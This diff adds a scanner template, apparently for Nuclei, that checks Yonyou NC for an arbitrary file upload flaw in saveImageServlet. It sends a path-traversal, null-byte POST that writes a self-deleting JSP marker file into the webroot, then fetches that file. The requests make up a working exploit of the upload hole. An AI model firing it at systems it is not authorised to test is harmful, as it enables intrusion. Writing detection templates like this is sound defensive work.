@@ -1,0 +1,43 @@
+id: yonyoun-nc-doPost-upload
+info:
+  name: yonyoun-nc-doPost-upload
+  author: apple
+  severity: critical
+  description: 用友NC saveImageServlet任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+  
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=..\\..\\..\\..\\webapps\\nc_web\\{{filename}}.jsp%00 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Content-Type: application/octet-stream
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=FCE1ED69F4FCE8096639429C0A41208C.server
+        Connection: close
+        Content-Length: 14
+
+        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+        Referer: http://20.70.28.161:18080/login?redirect=%2Findex
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
